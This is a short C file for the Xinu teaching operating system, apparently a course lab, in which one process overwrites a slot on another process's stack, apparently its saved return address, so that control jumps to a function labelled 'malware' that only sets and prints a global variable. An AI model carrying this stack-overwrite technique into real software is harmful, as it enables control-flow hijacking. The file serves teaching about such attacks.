#include <xinu.h>
#include <stdio.h>

extern int myvictimglobal;

void myattacker(void){
	struct procent *victim = &proctab[currpid - 1];
	int* addr = (int*) (victim->prstkbase - 84);
	*addr = myattackermalware;
}

void myattackermalware(void){
	myvictimglobal = 1;
	kprintf("%d: myvictimglobal: %d\n", currpid, myvictimglobal);
}